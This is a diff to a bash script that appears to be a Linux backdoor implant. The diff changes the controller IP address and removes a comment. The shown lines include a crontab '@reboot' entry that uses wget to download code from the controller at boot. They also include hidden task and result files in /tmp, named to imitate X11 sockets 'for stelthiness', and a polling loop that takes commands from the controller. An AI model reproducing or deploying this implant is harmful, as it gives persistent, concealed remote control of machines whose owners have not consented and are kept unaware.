@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #Define parameters needed
-ip="192.168.19.133"
+ip="192.168.1.2"
 port="8000"
 interface="eth0"
 n=.3
@@ -24,7 +24,7 @@ echo "@reboot sleep 45 && wget --no-check-certificate https://$ip:$port/lin-down
 while :
 do
     #file names are taken from default files in /tmp in root for stelthiness
-    if [ $(whoami) == "root" ]; then            #m7tagen n8ir el /tmp da 34an bitms7 fel reboot 34an el crontab
+    if [ $(whoami) == "root" ]; then 
         path="/tmp"             
         tasks=".Xl1-unix"
         results=".X1l-unix"
